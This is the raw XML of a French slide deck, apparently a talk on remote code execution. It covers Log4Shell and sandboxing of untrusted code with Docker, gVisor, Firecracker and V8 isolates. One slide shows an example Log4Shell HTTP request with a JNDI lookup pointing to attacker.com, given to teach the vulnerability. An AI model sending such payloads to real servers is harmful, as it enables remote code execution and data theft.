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4ba2d1c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4ba2d1c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47aeec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47aeec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4fa15d7c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4fa15d7c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1a527d0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1a527d0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347aeec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347aeec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47aeec9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47aeec9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4ba2d1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4ba2d1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347aeec9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347aeec9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347aeec9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347aeec9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347aeec9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347aeec9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347aeec9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347aeec9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47aeec9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347aeec9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1a527d0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1a527d0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1a527d0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1a527d0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4fa15d7c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4fa15d7c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fa15d7c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4fa15d7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261939b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261939b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fa15d7c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4fa15d7c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4fa15d7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4fa15d7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4fa15d7c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4fa15d7c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261939b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261939b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1a527d09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1a527d09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261939ba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261939ba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1a527d09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1a527d0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1a527d09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1a527d09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1a527d09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1a527d09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1a527d09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1a527d09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4fa15d7c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4fa15d7c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261939ba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261939ba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1a527d09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1a527d09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4fa15d7c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4fa15d7c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30.jpg"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://stackoverflow.com/questions/32756988/what-is-meant-by-shared-kernel-in-docker" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://stackoverflow.com/users/6309/vonc" TargetMode="External"/><Relationship Id="rId7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Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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jp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Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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hyperlink" Target="https://plato.stanford.edu/entries/turing-machine/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://stackoverflow.com/questions/32756988/what-is-meant-by-shared-kernel-in-docker" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://vector.dev/docs/reference/vrl/" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://plato.stanford.edu/entries/church-turing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ibm.com/think/topics/log4shell" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://arstechnica.com/information-technology/2021/12/as-log4shell-wreaks-havoc-payroll-service-reports-ransomware-attack/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://deno.com/blog/subhosting-security-run-untrusted-code" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.theguardian.com/technology/2021/dec/10/software-flaw-most-critical-vulnerability-log-4-shell" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.washingtonpost.com/technology/2021/12/20/log4j-hack-vulnerability-java/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://gvisor.dev/docs/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://firecracker-microvm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Code Execution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 éviter de que ton produit devienne une </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>plateforme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> de Bitcoin mining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691575" y="463500"/>
            <a:ext cx="82812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C’est quoi ça ?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390475"/>
            <a:ext cx="5583900" cy="29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800"/>
              <a:t>Remote</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>: À distance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800"/>
              <a:t>Code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>: Du Code dans un certain langage informatique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800"/>
              <a:t>Execution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>: En français, Runner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RCE == runner du code à distance sur une autre machine que la tienne</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="62" name="Google Shape;62;p14" title="monkey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900" y="1337575"/>
            <a:ext cx="2943601" cy="294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281100"/>
            <a:ext cx="85206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🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>FLEUR🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>🔥</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="68" name="Google Shape;68;p15" title="eaacb919-5046-4ad4-9bb9-7419d27a1a5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00" y="1200850"/>
            <a:ext cx="3103043" cy="366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996275" y="1299175"/>
            <a:ext cx="4710600" cy="3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Botpress depuis </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2019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ULAVAL </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A2014 - H2023</a:t>
            </a:r>
            <a:endParaRPr b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 génie minier ❌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Certificat philo ❌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Certificat linguistique ❌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 génie informatique ✅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Début en informatique en </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2015</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> avec MATLAB et VBA 👨‍💻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Team lead équipe SQUID 🦑 (SDK)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0" name="Google Shape;70;p15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2248875" y="1739825"/>
            <a:ext cx="1451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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3699975" y="1555175"/>
            <a:ext cx="43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moi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881600" y="3667050"/>
            <a:ext cx="74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🍆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11700" y="426725"/>
            <a:ext cx="85206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C@Q1: JEX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C@Q8: RCE</a:t>
            </a:r>
            <a:endParaRPr sz="2300"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="78" name="Google Shape;78;p16" title="caq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450" y="1120925"/>
            <a:ext cx="4652232" cy="34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990025" y="1987825"/>
            <a:ext cx="43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moi</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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2511950" y="2173675"/>
            <a:ext cx="4513200" cy="3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Partie 1</a:t>
            </a:r>
            <a:endParaRPr/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Définitions et enjeux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691575" y="463500"/>
            <a:ext cx="73923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C’est quoi ça ?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75" y="1101600"/>
            <a:ext cx="8733265" cy="373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3411275" y="2681925"/>
            <a:ext cx="2575500" cy="27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1687100" y="1337625"/>
            <a:ext cx="2575500" cy="273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Code… ⌛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500" y="934600"/>
            <a:ext cx="448781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retard.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="33893" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4133026" y="634613"/>
            <a:ext cx="4553126" cy="387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486250" y="623000"/>
            <a:ext cx="3373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Brodeur…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00" y="1366513"/>
            <a:ext cx="43053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 title="rip315.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="26513" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="972463" y="0"/>
            <a:ext cx="71990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2719200" y="227925"/>
            <a:ext cx="335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</a:rPr>
              <a:t>Novembre 2021 - </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:srgbClr val="EFEFEF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Log4Shell</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:srgbClr val="EFEFEF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638200" y="4017425"/>
            <a:ext cx="828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-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the single biggest, most critical vulnerability ever” - Tenable </a:t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-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"arguably the most severe vulnerability ever" - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ars Technica</a:t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-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>border on the apocalyptic." - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Washington Post</a:t>
            </a:r>
            <a:endParaRPr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 title="log4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226" y="97974"/>
            <a:ext cx="4148250" cy="171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430250" y="1295663"/>
            <a:ext cx="795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Log4Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Vulnérabilité introduite en 2013, découverte en 2021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Log4J</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Librairie de logger; supporte un templating language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JNDI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Java Naming and Directory Interface; API for naming service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LDAP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Lightweight Directory Access Protocol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1564400" y="2919875"/>
            <a:ext cx="5226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GET / HTTP/1.1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Host: victim.com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User-Agent: ${jndi:ldap://attacker.com/exploit}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Connection: close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2" name="Google Shape;122;p22" title="jav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0700" y="2410700"/>
            <a:ext cx="1804075" cy="230408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Log4Shell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Risques</a:t>
            </a:r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645800" y="1329550"/>
            <a:ext cx="7225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hacker pourrait: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Accéder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> à des données confidentielles sur </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>disque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ou </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BD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Ex: mdp, api keys, api tokens, user emails, etc…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Monopoliser des ressources comme le </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, la </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, le </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>disque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ou le </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>réseau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> et dégrader les performances du systèmes pour les autres utilisateurs.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Ex: une boucle infinie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Utiliser des ressources gratuitement à des fins personnelles.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Ex: Bitcoin Mining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0" name="Google Shape;130;p23" title="monkey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7175" y="524225"/>
            <a:ext cx="1705651" cy="170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1834350" y="1794150"/>
            <a:ext cx="3470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RCE === mal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Merci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37" name="Google Shape;137;p24" title="drugs-are-bad.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="13464" l="19793" r="23277" t="13156"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5444325" y="763100"/>
            <a:ext cx="3045025" cy="392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43" name="Google Shape;143;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691575" y="1405550"/>
            <a:ext cx="437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Sauf si c’est ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>business</a:t>
            </a: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5" title="sufac.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="29903" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4398876" y="1405550"/>
            <a:ext cx="3702826" cy="297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 title="lamb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400" y="2171200"/>
            <a:ext cx="2205801" cy="220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Partie 2</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p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Objectifs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463450" y="1101600"/>
            <a:ext cx="83952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Protéger les données des autres utilisateur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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Controller les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ressources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: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lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Calcul (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CPU)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lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mémoire (RAM)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lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Périphériques (Disque, Réseau)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S’assurer que les utilisateurs paient pour les ressources utilisées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691575" y="3253750"/>
            <a:ext cx="24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 cherche à </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>isoler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59" name="Google Shape;159;p27" title="isolation-mem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450" y="2918550"/>
            <a:ext cx="2284831" cy="20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Objectifs</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="165" name="Google Shape;165;p28" title="isolation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58" y="1394450"/>
            <a:ext cx="8522175" cy="34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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691575" y="463500"/>
            <a:ext cx="74313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Isoler avec docker ?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="171" name="Google Shape;171;p29" title="dock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750" y="1101600"/>
            <a:ext cx="2251975" cy="19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docker-kerne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050" y="1242075"/>
            <a:ext cx="4358625" cy="32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304775" y="4404700"/>
            <a:ext cx="830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https://stackoverflow.com/questions/32756988/what-is-meant-by-shared-kernel-in-docker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 u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://stackoverflow.com/users/6309/vonc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5000" y="3025154"/>
            <a:ext cx="2695575" cy="20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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691575" y="463500"/>
            <a:ext cx="74313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Isoler avec docker ?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="180" name="Google Shape;180;p30" title="noisy neighb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9825" y="1143950"/>
            <a:ext cx="2102119" cy="37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 title="docker-kerne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050" y="1242075"/>
            <a:ext cx="4358625" cy="32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807050" y="947675"/>
            <a:ext cx="287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Noisy Neighbor</a:t>
            </a:r>
            <a:endParaRPr b="1"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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="127700" y="364450"/>
            <a:ext cx="86277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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Cloud Run functions</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="188" name="Google Shape;188;p31" title="google-cloud-fun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325" y="248175"/>
            <a:ext cx="1123425" cy="11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/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="5711" l="9065" r="3849" t="4626"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5753125" y="2671325"/>
            <a:ext cx="3002275" cy="19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 title="gvis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600" y="2994675"/>
            <a:ext cx="4404350" cy="1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861050" y="1371600"/>
            <a:ext cx="437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Utilise gVisor pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>contrôler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> les syscalls qui sont fait au kernel et rajouter une couche d’isolation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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="127700" y="364450"/>
            <a:ext cx="86277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Lambda</a:t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861050" y="1371600"/>
            <a:ext cx="437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Utilise </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Firecracker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> pour créer et manager des micro VMs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8" name="Google Shape;198;p32" title="lamb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8000" y="224800"/>
            <a:ext cx="1543026" cy="154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225" y="2270525"/>
            <a:ext cx="4052179" cy="27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 title="firecracker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1038" y="2232425"/>
            <a:ext cx="3820116" cy="27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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="127700" y="364450"/>
            <a:ext cx="86277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 Cloud</a:t>
            </a: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861050" y="1371600"/>
            <a:ext cx="437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Utilise le concept V8 d’</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>isolate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> pour isoler des programmes JavaScript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7" name="Google Shape;207;p33" title="de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249" y="140024"/>
            <a:ext cx="2001200" cy="20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 title="v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450" y="2141225"/>
            <a:ext cx="2728200" cy="27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 title="chro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0850" y="2394675"/>
            <a:ext cx="2307075" cy="230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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="127700" y="364450"/>
            <a:ext cx="86277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V8 Isolates</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="215" name="Google Shape;215;p34" title="llm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298" y="822025"/>
            <a:ext cx="5508726" cy="41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/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="309000" y="1181150"/>
            <a:ext cx="39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Usage chez Botpress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7" name="Google Shape;217;p34" title="sly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00" y="1918875"/>
            <a:ext cx="2786750" cy="278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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6983900" y="3619000"/>
            <a:ext cx="254100" cy="28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</a:t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463450" y="1101600"/>
            <a:ext cx="81672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Et si on voulait exécuter du code sans savoir à l’avance à quel utilisateur faire payer la facture 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5" name="Google Shape;225;p35" title="bitco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350" y="1679050"/>
            <a:ext cx="4730125" cy="31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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691575" y="463500"/>
            <a:ext cx="42771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Défi</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="231" name="Google Shape;231;p36" title="bp-vr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800" y="1254000"/>
            <a:ext cx="6956506" cy="3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 - Partie 3</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="237" name="Google Shape;237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Boucle étranges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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691575" y="463500"/>
            <a:ext cx="74832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De Turing</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="243" name="Google Shape;243;p38" title="turing-machine.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="30481" l="0" r="0" t="30079"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184700" y="2913225"/>
            <a:ext cx="3591651" cy="18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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="516625" y="1352350"/>
            <a:ext cx="4376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Modèle théorique de machine capable d’effectuer tout type de calcul. (Church–Turing thesis)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On dit d’un système, d’une machine ou d’un langage informatique qu’il est “</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Turing Complete</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” s’il permet de simuler une machine de turing.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5" name="Google Shape;245;p38" title="turin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125" y="197125"/>
            <a:ext cx="1896276" cy="2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9" title="escher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325" y="403475"/>
            <a:ext cx="3773101" cy="451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 txBox="1"/>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691575" y="463500"/>
            <a:ext cx="74832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De Turing</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Google Shape;252;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="660975" y="1625875"/>
            <a:ext cx="4543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AutoNum type="arabicPeriod"/>
            </a:pPr>
            <a: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  <a:t>Branchement conditionnel</a:t>
            </a:r>
            <a:b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</a:b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AutoNum type="arabicPeriod"/>
            </a:pPr>
            <a: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  <a:t>Récursivité ou branchement </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F8F9FA"/>
                </a:highlight>
              </a:rPr>
              <a:t>arbitraire</a:t>
            </a:r>
            <a:b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</a:b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AutoNum type="arabicPeriod"/>
            </a:pPr>
            <a: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  <a:t>Manipulation d'une quantité </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F8F9FA"/>
                </a:highlight>
              </a:rPr>
              <a:t>arbitraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F8F9FA"/>
                </a:highlight>
              </a:rPr>
              <a:t> de mémoire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50" y="676650"/>
            <a:ext cx="20764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1000" y="676650"/>
            <a:ext cx="20764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325" y="3313400"/>
            <a:ext cx="20764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4825" y="3973525"/>
            <a:ext cx="20764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0" title="escher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5220" y="2726795"/>
            <a:ext cx="1749200" cy="15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1" title="vr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950" y="1211575"/>
            <a:ext cx="1648600" cy="16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>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="243850" y="463500"/>
            <a:ext cx="86106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VRL: Vector Remap Language</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="268" name="Google Shape;268;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472450" y="1211575"/>
            <a:ext cx="5692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Langage utilisé par </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; un engin pour construire des pipelines d’observabilité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Appartient à Datadog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******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Compile en rust natif, donc profite de tous les avantages de Rust </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
